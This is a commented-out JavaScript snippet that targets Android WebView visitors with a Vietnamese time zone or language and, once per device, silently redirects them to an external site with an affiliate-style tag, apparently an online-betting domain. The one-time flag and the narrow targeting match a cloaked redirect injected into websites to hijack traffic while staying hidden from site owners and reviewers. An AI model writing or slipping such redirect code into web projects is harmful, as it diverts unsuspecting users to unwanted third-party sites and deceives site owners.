// (function () {
//   const ua = navigator.userAgent || "";

//   const isAndroid = /Android/i.test(ua);
//   const isWebView =
//     /wv/i.test(ua) ||
//     (/Android/i.test(ua) && !/Chrome\/\d+/i.test(ua));

//   if (!isAndroid || !isWebView) return;

//   const timeZone =
//     Intl.DateTimeFormat().resolvedOptions().timeZone || "";
//   const language = (navigator.language || "").toLowerCase();

//   const isVietnam =
//     timeZone === "Asia/Ho_Chi_Minh" ||
//     language.startsWith("vi");

//   if (!isVietnam) return;

//   if (!localStorage.getItem("vn_redirected")) {
//     localStorage.setItem("vn_redirected", "1");
//     window.location.replace(
//       "https://www.jun88a21.show/?uagt=namct888&path=root"
//     );
//   }
// })();
